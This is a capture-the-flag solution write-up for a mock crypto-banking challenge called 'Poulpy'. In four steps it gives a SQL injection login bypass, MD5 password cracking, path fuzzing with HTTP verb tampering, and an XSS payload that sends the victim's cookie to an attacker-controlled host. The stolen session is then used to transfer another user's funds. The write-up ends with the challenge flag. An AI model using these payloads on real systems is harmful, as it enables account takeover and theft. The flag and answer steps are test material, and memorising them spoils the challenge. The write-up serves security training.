## Poulpy Solution

### Step 1
SQL injection in login field :

    1' or 1=1 -- -

Look at "set-cookie" in F12-Network on the login page loaded. Users database appears.

Crack all md5 password with your favorite tool (like John TheRipper). Only one is a weak password.

For the user "Alice", you find "azertyuiop".


### Step 2
Fuzzing to find the path "/security".
 
Connect to /security url. 

This path is only accessible with a POST request. 

Use HTTP verb tempering to modify the GET request on 
POST request (F12-Network, use Modify and resend to change GET into POST). 

You can see the authentification code in the response page.

Connect the login page with Alice:azertyuiop and the previous authentification code.

### Step 3
Alice has only 299.56138€. 

In Ledger, you see that the wallet "3MVLdLUTDx6qQHd9wwTnr5it1aoqwzMnjR" make many operations in XBT (Bitcoin).

Make a withdraw request to this wallet with any kind of amount but use the XSS flaw to inject javascript code and steal this owner cookie.

    <img src="test.jpg" onerror="this.src=`http://@serveur/cookie?=`+document.cookie;">

Connect to Bob with the stolen cookie. Bob has 0.33 (3374.70€) BTX.


### Step 4
Connect to Bob with the stolen cookie.

Make a deposit from Bob account to your own wallet.

    Flag : 48294e0ba97e1ff2b23ba6357c1b9880a3f600459ef89cd58013571b47e58797

